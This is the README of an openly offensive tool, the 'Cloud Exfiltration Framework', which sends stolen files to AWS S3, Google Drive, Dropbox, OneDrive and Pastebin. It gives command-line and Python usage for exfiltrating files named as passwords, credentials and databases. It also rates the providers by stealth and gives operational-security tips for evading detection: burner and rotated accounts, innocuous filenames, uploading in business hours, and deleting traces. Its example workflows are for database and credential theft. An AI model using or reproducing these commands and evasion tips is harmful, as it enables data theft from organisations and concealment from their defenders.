# Cloud Exfiltration Framework

Exfiltrate data via legitimate cloud services - AWS S3, Google Drive, Dropbox, OneDrive, Pastebin.

## Features

- Multiple cloud providers (5 services)
- Automatic credential management
- File size validation
- Progress reporting
- Error handling with helpful messages
- Modular provider architecture

## Installation
```bash
# Install all dependencies
pip install boto3 google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client dropbox requests

# Or install per service
pip install boto3  # AWS S3
pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client  # Google Drive
pip install dropbox  # Dropbox
pip install requests  # OneDrive, Pastebin
```

## Usage

### AWS S3
```bash
python3 cloud_exfil.py --file sensitive.zip --service s3 \\
  --bucket my-exfil-bucket \\
  --aws-key AKIAIOSFODNN7EXAMPLE \\
  --aws-secret wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \\
  --region us-east-1
```

### Google Drive
```bash
# First time: authenticate and save token
python3 cloud_exfil.py --file database.sql --service gdrive \\
  --gdrive-creds credentials.json

# Subsequent uploads use saved token
python3 cloud_exfil.py --file data.zip --service gdrive \\
  --gdrive-creds credentials.json --folder-id FOLDER_ID
```

### Dropbox
```bash
python3 cloud_exfil.py --file passwords.txt --service dropbox \\
  --dropbox-token YOUR_ACCESS_TOKEN \\
  --dropbox-path /backups/passwords.txt
```

### OneDrive
```bash
python3 cloud_exfil.py --file documents.zip --service onedrive \\
  --onedrive-token YOUR_ACCESS_TOKEN \\
  --onedrive-folder backups
```

### Pastebin
```bash
# Text files only, max ~512KB
python3 cloud_exfil.py --file credentials.txt --service pastebin \\
  --pastebin-key YOUR_API_KEY
```

## Module Usage
```python
from cloud_exfil import CloudExfiltrator

# Initialize
exfil = CloudExfiltrator()

# AWS S3
result = exfil.exfil_to_s3(
    'data.zip',
    bucket_name='my-bucket',
    aws_access_key='KEY',
    aws_secret_key='SECRET'
)

# Google Drive
result = exfil.exfil_to_google_drive(
    'database.sql',
    credentials_file='credentials.json'
)

# Dropbox
result = exfil.exfil_to_dropbox(
    'passwords.txt',
    access_token='TOKEN'
)

# OneDrive
result = exfil.exfil_to_onedrive(
    'documents.zip',
    access_token='TOKEN'
)

# Pastebin
result = exfil.exfil_via_pastebin(
    'small_data.txt',
    api_key='KEY',
    is_file=True
)
```

## Getting API Credentials

### AWS S3
1. Go to AWS IAM Console
2. Create new user with S3 access
3. Generate access key pair
4. Create S3 bucket

### Google Drive
1. Go to Google Cloud Console
2. Create project and enable Drive API
3. Create OAuth 2.0 credentials
4. Download credentials JSON

### Dropbox
1. Go to Dropbox App Console
2. Create new app
3. Generate access token

### OneDrive
1. Register app in Azure Portal
2. Get Microsoft Graph access token
3. Use delegated permissions

### Pastebin
1. Sign up at pastebin.com
2. Get API key from account settings

## Architecture

- `core.py` - Main CloudExfiltrator interface
- `base_provider.py` - Base class for all providers
- `aws_s3.py` - AWS S3 implementation
- `google_drive.py` - Google Drive implementation
- `dropbox.py` - Dropbox implementation
- `onedrive.py` - OneDrive implementation
- `pastebin.py` - Pastebin implementation
- `cli.py` - Command-line interface

## Provider Comparison

| Provider | Max File Size | Cost | Speed | Stealth | Setup |
|----------|---------------|------|-------|---------|-------|
| **S3** | Unlimited | $ | Fast | High | Medium |
| **Google Drive** | 15GB free | Free | Fast | High | Medium |
| **Dropbox** | 2GB free | Free | Fast | High | Easy |
| **OneDrive** | 5GB free | Free | Fast | High | Hard |
| **Pastebin** | ~512KB | Free | Fast | Low | Easy |

## Security Considerations

- **Encryption**: Encrypt files before upload
- **Cleanup**: Delete files from cloud after retrieval
- **Accounts**: Use burner accounts for operations
- **Logs**: Cloud providers log all uploads
- **Detection**: Unusual upload patterns may trigger alerts

## Limitations

- Requires internet access
- Cloud account can be suspended
- Logs stored on provider's servers
- Rate limits may apply
- Some providers require OAuth flow

## OpSec Tips

1. **Use burner accounts** - Don't use personal accounts
2. **Rotate accounts** - Use different accounts per operation
3. **Encrypt data** - Always encrypt before upload
4. **Delete after retrieval** - Clean up cloud storage
5. **Blend in** - Use during business hours
6. **Normal filenames** - "meeting_notes.docx" not "passwords.txt"
7. **Check logs** - Verify uploads completed

## Example Workflows

### Large Database Exfiltration
```bash
# 1. Encrypt and compress
tar -czf database.tar.gz database/
gpg -c database.tar.gz  # Creates database.tar.gz.gpg

# 2. Upload to S3
python3 cloud_exfil.py --file database.tar.gz.gpg --service s3 \\
  --bucket exfil-bucket --aws-key KEY --aws-secret SECRET

# 3. Clean up
rm database.tar.gz database.tar.gz.gpg
```

### Quick Credential Exfil
```bash
# Upload to Pastebin (fast, easy)
python3 cloud_exfil.py --file creds.txt --service pastebin \\
  --pastebin-key KEY
```